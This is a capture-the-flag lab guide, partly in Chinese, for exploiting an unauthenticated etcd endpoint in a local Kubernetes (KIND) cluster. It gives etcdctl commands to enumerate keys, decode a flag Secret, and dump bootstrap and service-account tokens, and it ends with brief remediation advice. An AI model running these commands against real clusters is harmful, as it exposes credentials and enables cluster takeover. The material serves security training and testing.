# K8S-08: etcd Unauthorized Access

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-08 |
| 名称 | etcd Unauthorized Access |
| 技术/CVE | N/A (misconfiguration) |
| 难度 | L3 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：N/A (misconfiguration)
- 难度：L3
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- etcd exposed without authentication |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-08-etcd |
| Flag Location | etcd key `/registry/secrets/kube-system/etcd-flag` |

## Attack Path Summary
1. etcd is exposed on port 2379 (mapped to host port 11379) without authentication
2. etcdctl can connect directly to the etcd store and enumerate all keys
3. Kubernetes stores all cluster state (including secrets) in etcd
4. The flag is stored as a Kubernetes Secret and persisted in etcd
5. Read the secret value directly from etcd using etcdctl

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-08-etcd`
- `etcdctl` binary installed on the attack machine
- Network access to localhost:11379

## Step-by-Step Exploitation

### Step 1: Verify etcd Port Mapping
The etcd port is mapped from the KIND container port 2379 to host port 11379:

```bash
# Check that the port mapping is active
curl -s http://localhost:11379/version
# Expected: JSON with etcd server version info

# Or use curl to check health
curl -s http://localhost:11379/health
# Expected: {"health": "true"}
```

### Step 2: Install etcdctl
```bash
# If etcdctl is not installed:
# Method 1: apt
sudo apt-get install -y etcd-client

# Method 2: Direct download
ETCD_VERSION="v3.5.12"
curl -L https://github.com/etcd-io/etcd/releases/download/${ETCD_VERSION}/etcd-${ETCD_VERSION}-linux-amd64.tar.gz \
    | tar xz -C /tmp
sudo mv /tmp/etcd-${ETCD_VERSION}-linux-amd64/etcdctl /usr/local/bin/
```

### Step 3: Enumerate etcd Keys
```bash
# List all keys in etcd (Kubernetes stores everything under /registry/)
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get / --prefix --keys-only
# Expected: thousands of keys including:
# /registry/secrets/kube-system/etcd-flag
# /registry/secrets/kube-system/...
# /registry/pods/...
# /registry/configmaps/...
# /registry/deployments/...
```

### Step 4: Read the Flag Secret Directly from etcd
```bash
# Read the specific secret key
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag
# Expected: JSON with the full Secret object
```

### Step 5: Parse the Flag from the Output
```bash
# Read and decode the flag
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag \
    --print-value-only | python3 -c "import sys,json; d=json.load(sys.stdin); print(__import__('base64').b64decode(d['data']['flag']).decode())"
# Expected: flag{k8s-08-*}

# Or step by step:
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag \
    --print-value-only > /tmp/etcd_output.json
cat /tmp/etcd_output.json | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
flag = base64.b64decode(data['data']['flag']).decode()
print(flag)
"
```

### Step 6: Explore Other Sensitive Data in etcd
```bash
# List all secrets in etcd
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets --prefix --keys-only

# Read bootstrap tokens (can be used for cluster admin access)
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/bootstrap-token --prefix

# Read service account tokens
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system --prefix --keys-only | head -20
```

### Step 7: Capture Flag
- Flag format: `flag{k8s-08-*}`
- Flag location: etcd key `/registry/secrets/kube-system/etcd-flag`
- Access requirements: network access to etcd port (no auth)
- Expected output: `flag{k8s-08-default}` (or custom value from `CVE_FLAG`)

## Verification Commands
```bash
# Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-08-etcd

# Verify etcd port is accessible
curl -s http://localhost:11379/health
# Expected: {"health":"true"}

# Verify the flag secret exists via kubectl
kubectl get secret etcd-flag -n kube-system

# Direct etcd read (requires etcdctl)
ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/kube-system/etcd-flag
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | etcd client protocol, kubectl, and Kubernetes key layout |
| 侦察与前置条件 | Unauthenticated etcd endpoint discovery and /registry key enumeration |
| 核心漏洞与利用 | Query etcd without client authentication |
| 权限、横向或影响 | Full cluster state and secret disclosure |
| 验证 | Read the flag key from etcd |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
